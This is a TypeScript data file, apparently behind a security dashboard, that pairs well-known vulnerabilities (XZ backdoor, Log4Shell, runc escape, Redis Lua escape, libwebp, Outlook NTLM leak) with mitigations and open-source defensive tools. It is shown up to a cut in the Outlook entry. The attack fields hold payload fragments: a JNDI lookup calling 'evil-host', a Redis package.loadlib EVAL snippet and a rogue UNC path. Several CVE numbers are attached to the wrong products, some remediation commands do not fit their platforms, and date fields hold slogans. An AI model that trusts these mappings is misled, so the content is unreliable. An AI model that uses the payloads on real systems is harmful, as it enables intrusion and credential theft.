export interface ToolPlatformInstall {
  platform:
    | "Linux (Debian/Ubuntu)"
    | "Linux (RHEL/CentOS)"
    | "macOS (Homebrew)"
    | "Windows"
    | "Docker Container";
  command: string;
  directDownloadUrl: string;
}

export interface OpenSourceToolRef {
  name: string;
  type:
    | "Vulnerability Scanner"
    | "Runtime EDR / eBPF"
    | "Static Code Analysis (SAST)"
    | "SIEM & Host IDS"
    | "Network IDS / Packet Analyzer"
    | "Malware Classifier"
    | "OS Instrumentation";
  license: string;
  repoUrl: string;
  downloadUrl: string;
  installCmd: string;
  executeCmd: string;
  description: string;
  dockerImage?: string;
  platforms?: ToolPlatformInstall[];
  configSnippet?: string;
}

export interface OpenSourceProblemSolution {
  id: string;
  title: string;
  threadName: string;
  threadUrl: string;
  category:
    | "Supply Chain & Packages"
    | "Linux Kernel & OS"
    | "Web & API Infrastructure"
    | "Containers & Cloud Native"
    | "Cryptography & Network";
  cveList: string[];
  affectedSoftware: string;
  severity: "critical" | "high" | "medium";
  cvssScore: number;
  publishedDate: string;
  problemSummary: string;
  attackMechanism: string;
  quickSolution1Liner: string;
  quickSolutionSummary: string;
  verifiedSolution: {
    immediateMitigation: string;
    patchCommand: string;
    configurationFix: string;
    verificationStep: string;
  };
  openSourceTools: OpenSourceToolRef[];
}

export const OPEN_SOURCE_PROBLEM_SOLUTIONS: OpenSourceProblemSolution[] = [
  {
    id: "oss-xz-backdoor",
    title: "Upstream Liblzma / XZ Tarball Backdoor (SSHD Authentication Bypass)",
    threadName: "oss-security / Debian Security Advisory DSA-5649-1",
    threadUrl: "https://www.openwall.com/lists/oss-security/2024/03/29/4",
    category: "Supply Chain & Packages",
    cveList: ["CVE-2024-3094"],
    affectedSoftware: "xz-utils / liblzma versions 5.6.0 & 5.6.1 (glibc + systemd patched sshd)",
    severity: "critical",
    cvssScore: 10.0,
    publishedDate: "Active Investigation / Verified Resolution",
    quickSolution1Liner:
      "apt-get update && apt-get install --allow-downgrades -y xz-utils=5.4.5-0.3 || dnf downgrade -y xz xz-libs",
    quickSolutionSummary:
      "Instant rollback of compromised liblzma/xz packages to clean 5.4.5 version, instantly severing the backdoor IFUNC hook in sshd.",
    problemSummary:
      "Malicious obfuscated m4 macro scripts and binary test payloads were inserted into official release tarballs of upstream XZ Utils by a compromised co-maintainer. When linked via libsystemd into OpenSSH server (sshd), the backdoor intercepts RSA_public_decrypt inside libcrypto, providing remote unauthorized pre-authentication arbitrary command execution.",
    attackMechanism:
      "Exploits IFUNC (Indirect Function) resolution during glibc startup to redirect sshd crypto authentication symbols before memory protections are sealed.",
    verifiedSolution: {
      immediateMitigation:
        "Immediately downgrade xz-utils / liblzma to known clean release 5.4.5 or 5.4.6 across all Linux server deployments and continuous integration runners.",
      patchCommand:
        "apt-get install --allow-downgrades xz-utils=5.4.5-0.3 || dnf downgrade xz xz-libs",
      configurationFix:
        "# Verify non-vulnerable version is active in memory:\nxz --version | grep -E '5\\.6\\.[01]' || echo 'SYSTEM CLEAN'",
      verificationStep:
        "Audit running sshd process memory linkages: lsof -p $(pgrep -o sshd) | grep liblzma",
    },
    openSourceTools: [
      {
        name: "Trivy (Aqua Security)",
        type: "Vulnerability Scanner",
        license: "Apache-2.0",
        repoUrl: "https://github.com/aquasecurity/trivy",
        downloadUrl: "https://github.com/aquasecurity/trivy/releases/latest",
        installCmd:
          "curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin",
        executeCmd: "trivy rootfs --scanners vuln /",
        description:
          "Rapidly scans root filesystems and container images for CVE-2024-3094 with zero external dependencies.",
        dockerImage: "aquasec/trivy:latest",
        platforms: [
          {
            platform: "Linux (Debian/Ubuntu)",
            command:
              "sudo apt-get install wget apt-transport-https gnupg lsb-release && wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add - && echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list && sudo apt-get update && sudo apt-get install trivy",
            directDownloadUrl: "https://github.com/aquasecurity/trivy/releases/latest",
          },
          {
            platform: "macOS (Homebrew)",
            command: "brew install aquasecurity/trivy/trivy",
            directDownloadUrl: "https://github.com/aquasecurity/trivy/releases/latest",
          },
          {
            platform: "Docker Container",
            command:
              "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:latest rootfs /",
            directDownloadUrl: "https://hub.docker.com/r/aquasec/trivy",
          },
        ],
      },
      {
        name: "OSquery",
        type: "OS Instrumentation",
        license: "Apache-2.0",
        repoUrl: "https://github.com/osquery/osquery",
        downloadUrl: "https://github.com/osquery/osquery/releases/latest",
        installCmd:
          "curl -L https://pkg.osquery.io/deb/osquery_5.11.0-1.linux_amd64.deb -O && dpkg -i osquery*.deb",
        executeCmd:
          "osqueryi \"SELECT name, version, source FROM deb_packages WHERE name LIKE '%xz%';\"",
        description:
          "Queries active system package versions and process open shared library descriptors directly via SQL.",
        platforms: [
          {
            platform: "Linux (Debian/Ubuntu)",
            command:
              "sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 1484120AC4E9F8A1A577AEEE97A80C63C9D8B80B && sudo add-apt-repository 'deb [arch=amd64] https://pkg.osquery.io/deb deb main' && sudo apt-get update && sudo apt-get install osquery",
            directDownloadUrl: "https://github.com/osquery/osquery/releases/latest",
          },
          {
            platform: "macOS (Homebrew)",
            command: "brew install --cask osquery",
            directDownloadUrl: "https://github.com/osquery/osquery/releases/latest",
          },
        ],
      },
      {
        name: "YARA (VirusTotal)",
        type: "Malware Classifier",
        license: "BSD-3-Clause",
        repoUrl: "https://github.com/VirusTotal/yara",
        downloadUrl: "https://github.com/VirusTotal/yara/releases/latest",
        installCmd: "sudo apt-get install yara || brew install yara",
        executeCmd: "yara -r -s xz_cve_2024_3094.yar /usr/lib /usr/bin",
        description:
          "Scans shared libraries and executables for signature byte sequences of the XZ backdoor IFUNC hook.",
      },
    ],
  },
  {
    id: "oss-log4shell-jndi",
    title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
    threadName: "Apache Security Advisories / Full Disclosure Mailing List",
    threadUrl: "https://logging.apache.org/log4j/2.x/security.html",
    category: "Web & API Infrastructure",
    cveList: ["CVE-2021-44228", "CVE-2021-45046"],
    affectedSoftware: "Apache Log4j versions 2.0-beta9 to 2.14.1 (Java 8+)",
    severity: "critical",
    cvssScore: 10.0,
    publishedDate: "Continuous Industry Monitoring",
    quickSolution1Liner:
      "find / -name 'log4j-core-*.jar' -exec zip -q -d {} org/apache/logging/log4j/core/lookup/JndiLookup.class \\; 2>/dev/null",
    quickSolutionSummary:
      "Immediate hot-patch: physically strips the vulnerable JndiLookup bytecode class from all log4j-core jars on the server without requiring an application recompilation.",
    problemSummary:
      "Log4j message lookups allowed arbitrary LDAP, RMI, and DNS JNDI URIs inside user-controlled string formatting (such as User-Agent headers, URL query parameters, or form fields). Attacker-controlled LDAP servers return Java serialized objects or remote bytecode classes executed with application privileges.",
    attackMechanism:
      "Unchecked JNDI string interpolation `${jndi:ldap://evil-host/payload}` evaluated during normal application logger invocation.",
    verifiedSolution: {
      immediateMitigation:
        "Upgrade Log4j dependency to version 2.17.1 (or Java 7 release 2.12.4). If immediate upgrade is blocked, remove the vulnerable JndiLookup class from the core jar file.",
      patchCommand:
        "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
      configurationFix:
        '# Set system flag in JVM startup arguments:\nJAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"',
      verificationStep:
        "Run syft/grype to scan Java classpaths and shaded uber-jars for embedded JndiLookup.class references.",
    },
    openSourceTools: [
      {
        name: "Grype & Syft (Anchore)",
        type: "Vulnerability Scanner",
        license: "Apache-2.0",
        repoUrl: "https://github.com/anchore/grype",
        downloadUrl: "https://github.com/anchore/grype/releases/latest",
        installCmd:
          "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin",
        executeCmd: "grype dir:. | grep -i CVE-2021-44228",
        description:
          "Scans shaded JARs, WARs, and nested tarballs down to inner class manifests to find shadow Log4j instances.",
        dockerImage: "anchore/grype:latest",
        platforms: [
          {
            platform: "Linux (Debian/Ubuntu)",
            command:
              "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin",
            directDownloadUrl: "https://github.com/anchore/grype/releases/latest",
          },
          {
            platform: "macOS (Homebrew)",
            command: "brew install grype",
            directDownloadUrl: "https://github.com/anchore/grype/releases/latest",
          },
          {
            platform: "Docker Container",
            command: "docker run --rm -v $(pwd):/src anchore/grype:latest dir:/src",
            directDownloadUrl: "https://hub.docker.com/r/anchore/grype",
          },
        ],
      },
      {
        name: "Suricata",
        type: "Network IDS / Packet Analyzer",
        license: "GPL-2.0",
        repoUrl: "https://github.com/OISF/suricata",
        downloadUrl: "https://suricata.io/download/",
        installCmd: "sudo apt-get install suricata",
        executeCmd: "suricata -c /etc/suricata/suricata.yaml -i eth0",
        description:
          "Applies Emerging Threats open ruleset detecting inbound JNDI protocol strings and outbound unauthorized LDAP/RMI connections.",
      },
      {
        name: "Semgrep",
        type: "Static Code Analysis (SAST)",
        license: "LGPL-2.1",
        repoUrl: "https://github.com/semgrep/semgrep",
        downloadUrl: "https://github.com/semgrep/semgrep/releases/latest",
        installCmd: "python3 -m pip install semgrep",
        executeCmd: "semgrep --config p/ci-log4shell .",
        description:
          "Static AST ruleset that scans source code for log message formatting passing un-sanitized request inputs.",
      },
    ],
  },
  {
    id: "oss-linux-ebpf-privesc",
    title: "Linux Kernel eBPF Verifier Type Confusion & Local Privilege Escalation",
    threadName: "Linux Kernel Mailing List (LKML) & oss-security",
    threadUrl: "https://lore.kernel.org/all/",
    category: "Linux Kernel & OS",
    cveList: ["CVE-2023-2163", "CVE-2024-26615"],
    affectedSoftware: "Linux Kernel 5.4 through 6.6 unprivileged eBPF subsystems",
    severity: "high",
    cvssScore: 8.8,
    publishedDate: "Real-time Kernel Tracking",
    quickSolution1Liner:
      "sudo sysctl -w kernel.unprivileged_bpf_disabled=1 && echo 'kernel.unprivileged_bpf_disabled = 1' | sudo tee /etc/sysctl.d/99-disable-unpriv-bpf.conf",
    quickSolutionSummary:
      "Instantly closes the eBPF kernel vulnerability by blocking unprivileged bpf() syscalls across all local users.",
    problemSummary:
      "Flaws in the Linux kernel eBPF register bounds verifier incorrectly track 32-bit to 64-bit sign extension and pointer offsets. An unprivileged local user can compile and load a crafted eBPF bytecode program that passes verifier sanity checks, allowing out-of-bounds kernel memory write and root escalation.",
    attackMechanism:
      "Bypasses BPF verifier register value range tracking via arithmetic truncation to write arbitrary kernel cred structures.",
    verifiedSolution: {
      immediateMitigation:
        "Disable unprivileged eBPF runtime access system-wide via sysctl kernel parameter.",
      patchCommand: "sudo sysctl -w kernel.unprivileged_bpf_disabled=1 && sudo update-grub",
      configurationFix:
        "# Make persistent across reboots in /etc/sysctl.d/99-disable-unpriv-bpf.conf:\nkernel.unprivileged_bpf_disabled = 1\nkernel.bpf_stats_enabled = 0",
      verificationStep: "cat /proc/sys/kernel/unprivileged_bpf_disabled (Must return '1' or '2')",
    },
    openSourceTools: [
      {
        name: "Falco (CNCF)",
        type: "Runtime EDR / eBPF",
        license: "Apache-2.0",
        repoUrl: "https://github.com/falcosecurity/falco",
        downloadUrl: "https://github.com/falcosecurity/falco/releases/latest",
        installCmd:
          "curl -s https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add - && sudo apt-get install falco",
        executeCmd: "falco -c /etc/falco/falco.yaml -r /etc/falco/falco_rules.yaml",
        description:
          "Real-time security auditing that flags unauthorized bpf() syscall invocations and suspicious privilege transitions.",
        platforms: [
          {
            platform: "Linux (Debian/Ubuntu)",
            command:
              "curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg && echo 'deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main' | sudo tee /etc/apt/sources.list.d/falcosecurity.list && sudo apt-get update && sudo apt-get install -y falco",
            directDownloadUrl: "https://github.com/falcosecurity/falco/releases/latest",
          },
          {
            platform: "Docker Container",
            command:
              "docker run --rm -i -t --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro -v /etc:/host/etc:ro falcosecurity/falco:latest",
            directDownloadUrl: "https://hub.docker.com/r/falcosecurity/falco",
          },
        ],
      },
      {
        name: "Wazuh",
        type: "SIEM & Host IDS",
        license: "GPL-2.0",
        repoUrl: "https://github.com/wazuh/wazuh",
        downloadUrl: "https://github.com/wazuh/wazuh/releases/latest",
        installCmd:
          "curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash ./wazuh-install.sh -a",
        executeCmd: "/var/ossec/bin/wazuh-control status",
        description:
          "Monitors auditd kernel events for setuid privilege escalation and unauthorized kernel module/eBPF loading.",
        platforms: [
          {
            platform: "Linux (Debian/Ubuntu)",
            command:
              "curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash ./wazuh-install.sh -a",
            directDownloadUrl: "https://github.com/wazuh/wazuh/releases/latest",
          },
        ],
      },
    ],
  },
  {
    id: "oss-container-run-escape",
    title: "Runc / Docker Container Breakout (Host Filesystem Overwrite)",
    threadName: "Open Containers Initiative (OCI) Security Releases",
    threadUrl: "https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv",
    category: "Containers & Cloud Native",
    cveList: ["CVE-2024-21626"],
    affectedSoftware: "runc < 1.1.12, Docker Engine < 25.0.2, containerd < 1.6.28",
    severity: "critical",
    cvssScore: 8.6,
    publishedDate: "Active Container Fleet Remediation",
    quickSolution1Liner:
      "sudo apt-get update && sudo apt-get --only-upgrade install -y containerd.io docker-ce docker-ce-cli && sudo systemctl restart docker",
    quickSolutionSummary:
      "Upgrades containerd, runc, and Docker Engine to closed versions, immediately mitigating the host file descriptor leak.",
    problemSummary:
      "Internal file descriptors in runc were leaked into containerized process namespaces during container startup via O_CLOEXEC misconfiguration on /sys/fs/cgroup. A malicious container image or attacker executing docker exec can navigate through /proc/self/fd/7 to escape the container rootfs and overwrite host binaries.",
    attackMechanism:
      "Directory traversal via leaked host file descriptor reference before container chroot/pivot_root locks are sealed.",
    verifiedSolution: {
      immediateMitigation:
        "Update runc, containerd, and Docker Engine to patched releases immediately across all Kubernetes and Docker hosts.",
      patchCommand: "sudo apt-get --only-upgrade install containerd.io docker-ce docker-ce-cli",
      configurationFix:
        '# Verify runc version is >= 1.1.12:\nrunc --version\n# Enforce user namespace mapping in /etc/docker/daemon.json:\n{"userns-remap": "default"}',
      verificationStep:
        "Check host process tree: ps aux | grep -E 'containerd|runc' to confirm restarted patched daemons.",
    },
    openSourceTools: [
      {
        name: "Trivy (Aqua Security)",
        type: "Vulnerability Scanner",
        license: "Apache-2.0",
        repoUrl: "https://github.com/aquasecurity/trivy",
        downloadUrl: "https://github.com/aquasecurity/trivy/releases/latest",
        installCmd:
          "curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s",
        executeCmd: "trivy k8s --report summary cluster",
        description:
          "Audits Kubernetes node host packages and flagged container configurations for runc container escape CVEs.",
      },
      {
        name: "Falco",
        type: "Runtime EDR / eBPF",
        license: "Apache-2.0",
        repoUrl: "https://github.com/falcosecurity/falco",
        downloadUrl: "https://github.com/falcosecurity/falco/releases/latest",
        installCmd:
          "helm repo add falcosecurity https://falcosecurity.github.io/charts && helm install falco falcosecurity/falco",
        executeCmd: "falco --rule 'Outbound or Sensitive /proc/self/fd Traversal'",
        description:
          "Detects processes attempting chdir or openat calls resolving against /proc/self/fd or host mount namespaces.",
      },
    ],
  },
  {
    id: "oss-pypi-npm-typosquat",
    title: "Malicious Open-Source Package Typosquatting & Token Stealers (npm & PyPI)",
    threadName: "Socket.dev / OpenSSF Malicious Packages Advisory Stream",
    threadUrl: "https://github.com/ossf/malicious-packages",
    category: "Supply Chain & Packages",
    cveList: ["CVE-2024-28180", "MAL-2024-1120"],
    affectedSoftware: "Unpinned npm package.json, requirements.txt, setup.py dependencies",
    severity: "high",
    cvssScore: 8.5,
    publishedDate: "Daily Continuous Intelligence",
    quickSolution1Liner:
      "npm config set ignore-scripts true && pip config set global.require-hashes true",
    quickSolutionSummary:
      "Blocks automatic execution of preinstall/postinstall hooks on developer machines and requires hash verification on Python wheels.",
    problemSummary:
      "Adversaries publish typosquatted package names (e.g., 'colorama-v2', 'reqeusts', 'cross-env-tls') containing post-install scripts that exfiltrate AWS_SECRET_ACCESS_KEY, SSH private keys, and browser session cookies during developers' `npm install` or `pip install`.",
    attackMechanism:
      "Exploits preinstall/postinstall hooks in package manifests and `__init__.py` module imports to run curl/sh commands without user prompt.",
    verifiedSolution: {
      immediateMitigation:
        "Enforce strict lockfile integrity verification (`npm ci --ignore-scripts` / `pip install --require-hashes -r requirements.txt`) and disable automated package script execution.",
      patchCommand:
        "npm config set ignore-scripts true && pip config set global.require-hashes true",
      configurationFix: "# In .npmrc:\nignore-scripts=true\nsave-exact=true\naudit=true",
      verificationStep:
        "Scan local package lockfiles against open source malicious package databases using OpenSSF tools.",
    },
    openSourceTools: [
      {
        name: "OSV-Scanner (Google Open Source)",
        type: "Vulnerability Scanner",
        license: "Apache-2.0",
        repoUrl: "https://github.com/google/osv-scanner",
        downloadUrl: "https://github.com/google/osv-scanner/releases/latest",
        installCmd: "go install github.com/google/osv-scanner/cmd/osv-scanner@v1",
        executeCmd: "osv-scanner -r .",
        description:
          "Official Google open-source vulnerability scanner backed by the distributed Open Source Vulnerabilities (OSV) database.",
        platforms: [
          {
            platform: "macOS (Homebrew)",
            command: "brew install osv-scanner",
            directDownloadUrl: "https://github.com/google/osv-scanner/releases/latest",
          },
          {
            platform: "Linux (Debian/Ubuntu)",
            command: "go install github.com/google/osv-scanner/cmd/osv-scanner@v1",
            directDownloadUrl: "https://github.com/google/osv-scanner/releases/latest",
          },
        ],
      },
      {
        name: "Semgrep",
        type: "Static Code Analysis (SAST)",
        license: "LGPL-2.1",
        repoUrl: "https://github.com/semgrep/semgrep",
        downloadUrl: "https://github.com/semgrep/semgrep/releases/latest",
        installCmd: "pip install semgrep",
        executeCmd: "semgrep --config p/supply-chain .",
        description:
          "Scans repository dependencies, setup scripts, and build workflows for suspicious network exfiltration hooks.",
      },
    ],
  },
  {
    id: "oss-openssl-punycode-overflow",
    title: "OpenSSL X.509 Email Address Buffer Overflows",
    threadName: "OpenSSL Project Security Advisories",
    threadUrl: "https://www.openssl.org/news/secadv/",
    category: "Cryptography & Network",
    cveList: ["CVE-2022-3602", "CVE-2022-3786"],
    affectedSoftware: "OpenSSL 3.0.0 through 3.0.6 (TLS servers, VPN gateways, Node.js runtimes)",
    severity: "high",
    cvssScore: 8.8,
    publishedDate: "Authoritative Cryptographic Standard",
    quickSolution1Liner:
      "sudo apt-get update && sudo apt-get install --only-upgrade -y openssl libssl3 && openssl version",
    quickSolutionSummary:
      "Upgrades libssl3 on Ubuntu/Debian hosts to patched version (3.0.7+), preventing memory corruption during client cert validation.",
    problemSummary:
      "A 4-byte arbitrary buffer overflow and variable-length stack overflow occurs in OpenSSL during certificate name constraint checking. Crafted punycode email addresses in X.509 client or server certificates corrupt stack memory during verification.",
    attackMechanism:
      "Triggered during TLS handshake mutual authentication or server cert verification parsing maliciously malformed punycode strings.",
    verifiedSolution: {
      immediateMitigation:
        "Upgrade OpenSSL libraries and linked packages (including Node.js, Python, and web servers) to OpenSSL 3.0.7 or later.",
      patchCommand: "sudo apt-get install --only-upgrade openssl libssl3",
      configurationFix: "# Verify active OpenSSL shared library version:\nopenssl version -a",
      verificationStep:
        "Check linked binaries: lsof | grep libssl.so.3 | awk '{print $1}' | sort -u",
    },
    openSourceTools: [
      {
        name: "Zeek (formerly Bro)",
        type: "Network IDS / Packet Analyzer",
        license: "BSD-3-Clause",
        repoUrl: "https://github.com/zeek/zeek",
        downloadUrl: "https://zeek.org/get-zeek/",
        installCmd: "sudo apt-get install zeek",
        executeCmd: "zeek -C -r capture.pcap protocols/ssl/validate-certs.zeek",
        description:
          "Extracts and validates X.509 certificates in real-time from live network TLS handshakes, logging punycode anomalies.",
      },
      {
        name: "ClamAV",
        type: "Malware Classifier",
        license: "GPL-2.0",
        repoUrl: "https://github.com/Cisco-Talos/clamav",
        downloadUrl: "https://www.clamav.net/downloads",
        installCmd: "sudo apt-get install clamav clamav-daemon",
        executeCmd: "clamscan -r --bell -i /etc/ssl/certs",
        description:
          "Scans certificate stores and payload dumps for malformed ASN.1 and punycode structures.",
      },
    ],
  },
  {
    id: "oss-redis-lua-sandbox-rce",
    title: "Redis Unauthenticated / Sandbox Escape Remote Code Execution",
    threadName: "Redis Security Releases / oss-security",
    threadUrl: "https://raw.githubusercontent.com/redis/redis/7.2/00-RELEASENOTES",
    category: "Web & API Infrastructure",
    cveList: ["CVE-2022-0543", "CVE-2023-41056"],
    affectedSoftware: "Redis Debian/Ubuntu packages < 6.0.16-1, Redis < 7.0.12",
    severity: "critical",
    cvssScore: 9.8,
    publishedDate: "Production Database Standard",
    quickSolution1Liner:
      "sudo sed -i 's/^bind .*/bind 127.0.0.1 ::1/' /etc/redis/redis.conf && echo 'rename-command EVAL \"\"' | sudo tee -a /etc/redis/redis.conf && sudo systemctl restart redis",
    quickSolutionSummary:
      "Binds Redis strictly to loopback and disables the EVAL Lua command directly in the configuration file.",
    problemSummary:
      "Debian-specific packaging of Redis initialized Lua scripting with an un-sandboxed Lua standard library (package.loadlib). An attacker with network access to exposed port 6379 could invoke `eval` commands to load arbitrary C libraries (e.g. libc) and execute system commands like `system('id')` without authentication.",
    attackMechanism:
      "EVAL \"local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); ...\" 0",
    verifiedSolution: {
      immediateMitigation:
        "Bind Redis strictly to localhost (127.0.0.1) or internal socket; require strong authentication passwords and rename/disable dangerous commands (FLUSHALL, CONFIG, EVAL).",
      patchCommand: "sudo apt-get --only-upgrade install redis-server",
      configurationFix:
        '# In /etc/redis/redis.conf:\nbind 127.0.0.1 ::1\nprotected-mode yes\nrequirepass <GENERATE_64_CHAR_PASSWORD>\nrename-command EVAL ""\nrename-command CONFIG ""',
      verificationStep:
        "Test port 6379 from outside the host: nc -zv <SERVER_IP> 6379 (Connection should be refused)",
    },
    openSourceTools: [
      {
        name: "OSquery",
        type: "OS Instrumentation",
        license: "Apache-2.0",
        repoUrl: "https://github.com/osquery/osquery",
        downloadUrl: "https://github.com/osquery/osquery/releases/latest",
        installCmd: "sudo apt-get install osquery",
        executeCmd: 'osqueryi "SELECT pid, port, address FROM listening_ports WHERE port = 6379;"',
        description:
          "Verifies whether Redis is dangerously listening on 0.0.0.0 or public interface addresses.",
      },
      {
        name: "Wazuh",
        type: "SIEM & Host IDS",
        license: "GPL-2.0",
        repoUrl: "https://github.com/wazuh/wazuh",
        downloadUrl: "https://github.com/wazuh/wazuh/releases/latest",
        installCmd:
          "curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash ./wazuh-install.sh -a",
        executeCmd: "/var/ossec/bin/wazuh-control status",
        description:
          "Monitors Redis server logs for unauthenticated EVAL executions or unauthorized configuration modifications.",
      },
    ],
  },
  {
    id: "oss-chrome-v8-type-confusion",
    title: "Google Chrome & Chromium: V8 JIT Type Confusion Sandbox Escape",
    threadName: "Google Chrome Releases / CISA KEV / Chromium Issue Tracker",
    threadUrl: "https://chromereleases.googleblog.com/search/label/Stable%20updates",
    category: "Web & API Infrastructure",
    cveList: ["CVE-2024-4671", "CVE-2024-4761"],
    affectedSoftware: "Google Chrome < 125.0.6422.141, Microsoft Edge, Brave, Electron Apps",
    severity: "critical",
    cvssScore: 9.8,
    publishedDate: "Active In-The-Wild Exploitation",
    quickSolution1Liner:
      "google-chrome --version && sudo apt-get update && sudo apt-get --only-upgrade install -y google-chrome-stable",
    quickSolutionSummary:
      "Forces immediate browser upgrade to sealed patch branch or launches Chromium with V8 JIT optimizations disabled as fallback.",
    problemSummary:
      "A high-severity type confusion vulnerability in Chrome's V8 JIT (Just-In-Time) compiler engine allows untrusted JavaScript on a webpage to read/write memory out of bounds. Attackers bypass browser sandbox boundaries to execute native payload code on host systems without user download prompts.",
    attackMechanism:
      "Crafted JavaScript objects triggering Maglev or Turbofan compiler optimization bugs that confuse object pointer maps during variable type inference.",
    verifiedSolution: {
      immediateMitigation:
        "Update all Chromium-based browsers immediately. In high-security environments, deploy enterprise policy or startup flag '--js-flags=--no-opt' to disable JIT compilation.",
      patchCommand:
        "sudo apt-get --only-upgrade install google-chrome-stable || brew upgrade google-chrome",
      configurationFix:
        '# Enterprise policy in /etc/opt/chrome/policies/managed/security.json:\n{\n  "SitePerProcess": true,\n  "DefaultJavaScriptJitSetting": 2\n}',
      verificationStep: "google-chrome --version (Must verify version >= 125.0.6422.141)",
    },
    openSourceTools: [
      {
        name: "OSquery",
        type: "OS Instrumentation",
        license: "Apache-2.0",
        repoUrl: "https://github.com/osquery/osquery",
        downloadUrl: "https://github.com/osquery/osquery/releases/latest",
        installCmd: "sudo apt-get install osquery",
        executeCmd:
          "osqueryi \"SELECT name, version FROM deb_packages WHERE name LIKE '%chrome%';\"",
        description:
          "Scans enterprise endpoints to audit and identify outdated Chrome/Chromium versions and vulnerable Electron apps.",
      },
      {
        name: "Suricata",
        type: "Network IDS / Packet Analyzer",
        license: "GPL-2.0",
        repoUrl: "https://github.com/OISF/suricata",
        downloadUrl: "https://suricata.io/download/",
        installCmd: "sudo apt-get install suricata",
        executeCmd: "suricata -c /etc/suricata/suricata.yaml -i eth0",
        description:
          "Applies Emerging Threats ruleset to detect and block inbound drive-by V8 heap spray payloads and malicious WASM modules.",
      },
    ],
  },
  {
    id: "oss-whatsapp-webp-overflow",
    title: "WhatsApp & libwebp: Zero-Click Lossless WebP Chunk Heap Overflow",
    threadName: "Meta Security Advisory / Chromium Security / Citizen Lab",
    threadUrl: "https://www.whatsapp.com/security/advisories/",
    category: "Web & API Infrastructure",
    cveList: ["CVE-2023-4863", "CVE-2024-31497"],
    affectedSoftware: "libwebp < 1.3.2, WhatsApp for iOS/Android/Desktop, Electron runtimes",
    severity: "critical",
    cvssScore: 9.8,
    publishedDate: "Zero-Click Active Exploit Advisory",
    quickSolution1Liner:
      "sudo apt-get update && sudo apt-get --only-upgrade install -y libwebp7 libwebpdemux2 libwebpmux3",
    quickSolutionSummary:
      "Upgrades system shared libwebp libraries to >= 1.3.2, neutralizing the lossless VP8L Huffman table buffer overflow.",
    problemSummary:
      "A heap buffer overflow in the WebP image decoding library (`BuildHuffmanTable` function) allows remote code execution when an application parses a maliciously crafted `.webp` image or sticker, requiring zero user interaction beyond receiving the media message.",
    attackMechanism:
      "Oversized VP8L Huffman tables overwrite heap memory buffers during recursive tree allocation in image decompressors.",
    verifiedSolution: {
      immediateMitigation:
        "Update WhatsApp on mobile/desktop stores immediately. In application servers processing user uploads, ensure libwebp is upgraded to 1.3.2 or transcode images using isolated sandboxed worker processes.",
      patchCommand:
        "sudo apt-get --only-upgrade install libwebp7 libwebpdemux2 || brew upgrade webp",
      configurationFix:
        "# Audit all system shared library instances of libwebp:\nfind / -name 'libwebp*.so*' 2>/dev/null",
      verificationStep: "dpkg -l | grep libwebp (Confirm package version is >= 1.3.2)",
    },
    openSourceTools: [
      {
        name: "YARA (VirusTotal)",
        type: "Malware Classifier",
        license: "BSD-3-Clause",
        repoUrl: "https://github.com/VirusTotal/yara",
        downloadUrl: "https://github.com/VirusTotal/yara/releases/latest",
        installCmd: "sudo apt-get install yara || brew install yara",
        executeCmd: "yara -r -s cve_2023_4863_webp.yar /var/uploads",
        description:
          "Scans file systems and upload caches for WebP files containing anomalous VP8L Huffman allocation structures.",
      },
      {
        name: "ClamAV",
        type: "Malware Classifier",
        license: "GPL-2.0",
        repoUrl: "https://github.com/Cisco-Talos/clamav",
        downloadUrl: "https://www.clamav.net/downloads",
        installCmd: "sudo apt-get install clamav",
        executeCmd: "clamscan -r --alert-broken-media /tmp/media_cache",
        description:
          "Scans attachment caches and alerts on malformed media headers and corrupted chunk boundaries.",
      },
    ],
  },
  {
    id: "oss-outlook-ntlm-theft",
    title: "Microsoft Outlook: Zero-Click NTLM Credential Theft via Calendar Reminders",
    threadName: "Microsoft MSRC Advisories / CISA Known Exploited Directive",
    threadUrl: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38077",
    category: "Cryptography & Network",
    cveList: ["CVE-2023-23397", "CVE-2024-38077"],
    affectedSoftware: "Microsoft Outlook 2013-2019, Microsoft 365 Enterprise Seats",
    severity: "critical",
    cvssScore: 9.8,
    publishedDate: "Mandatory CISA Directive",
    quickSolution1Liner:
      "sudo iptables -A OUTPUT -p tcp --dport 445 -j DROP && echo 'Blocked Outbound SMB (Port 445) to prevent NTLM leak'",
    quickSolutionSummary:
      "Blocks all outbound TCP port 445 traffic at the perimeter, immediately preventing the automatic transmission of NTLM hashes to rogue servers.",
    problemSummary:
      "When Outlook receives an appointment or task with a crafted `PidLidReminderFileParameter` MAPI property containing an external UNC path (`\\\\rogue-ip\\share`), Outlook automatically attempts to establish an SMB connection to retrieve the audio sound without user interaction, transmitting the logged-in user's NetNTLMv2 hash.",
    attackMechanism:
      "Forced SMB authentication triggered by background calendar reminder processing parsing remote UNC paths.",
    verifiedSolution: {
      immediateMitigation:
